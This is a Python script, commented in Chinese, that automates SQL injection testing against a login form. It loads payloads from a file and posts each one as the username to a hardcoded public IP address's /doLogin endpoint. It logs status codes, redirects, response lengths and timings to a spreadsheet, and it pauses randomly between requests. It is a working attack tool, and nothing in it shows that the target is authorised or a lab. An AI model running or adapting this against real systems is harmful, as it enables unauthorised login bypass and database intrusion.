import requests
import time
import random
import pandas as pd

# ================== 配置区 ==================


URL = "http://120.77.14.42:8081/doLogin"


PAYLOAD_FILE = "sql_injection_payload.txt"

FIXED_PASSWORD = "test"


OUTPUT_EXCEL = "sql_injection_results.xlsx"

REQUEST_TIMEOUT = 5


DELAY_MIN = 0.3
DELAY_MAX = 1.2

PROXIES = None



# ================== 功能函数 ==================

def load_payloads(file_path: str):
    payloads = []
    with open(file_path, "r", encoding="utf-8") as f:
        for line in f:
            payload = line.rstrip("\n").rstrip("\r")
            if payload != "":
                payloads.append(payload)
    return payloads


def test_login(username_payload: str) -> dict:
    session = requests.Session()

    data = {
        "username": username_payload,
        "password": FIXED_PASSWORD,
    }

    try:
        resp = session.post(
            URL,
            data=data,
            allow_redirects=False,  
            timeout=REQUEST_TIMEOUT,
            proxies=PROXIES,
        )
    except requests.exceptions.RequestException as e:
        info = {
            "payload": username_payload,
            "status_code": None,
            "location": "",
            "response_length": 0,
            "elapsed_seconds": None,
            "error": str(e),
            "time": time.strftime("%Y-%m-%d %H:%M:%S"),
        }
        print("=" * 60)
        print(f"[!] 请求失败: {repr(username_payload)}")
        print(f"    错误: {e}")
        return info

    info = {
        "payload": username_payload,
        "status_code": resp.status_code,
        "location": resp.headers.get("Location", ""),
        "response_length": len(resp.text),
        "elapsed_seconds": resp.elapsed.total_seconds(),
        "error": "",
        "time": time.strftime("%Y-%m-%d %H:%M:%S"),
    }

    print("=" * 60)
    print(f"[+] Payload: {repr(username_payload)}")
    print(f"    状态码:        {info['status_code']}")
    print(f"    Location:      {info['location']}")
    print(f"    响应长度:      {info['response_length']}")
    print(f"    响应时间:      {info['elapsed_seconds']:.3f} s")

    return info


# ================== 主流程 ==================

def main():
    # 1. 读取 payload
    payloads = load_payloads(PAYLOAD_FILE)
    print(f"[+] 共加载 {len(payloads)} 条 payload\n")

    results = []

    # 2. 逐条测试
    for i, p in enumerate(payloads, start=1):
        print(f"\n[*] ({i}/{len(payloads)}) 测试中...")
        info = test_login(p)
        results.append(info)

        # 3. 每次请求之间随机暂停一下，避免太猛
        delay = random.uniform(DELAY_MIN, DELAY_MAX)
        time.sleep(delay)

    # 4. 保存到 Excel
    df = pd.DataFrame(results)
    df.to_excel(OUTPUT_EXCEL, index=False)
    print(f"\n[+] 所有结果已保存到: {OUTPUT_EXCEL}")


if __name__ == "__main__":
    main()
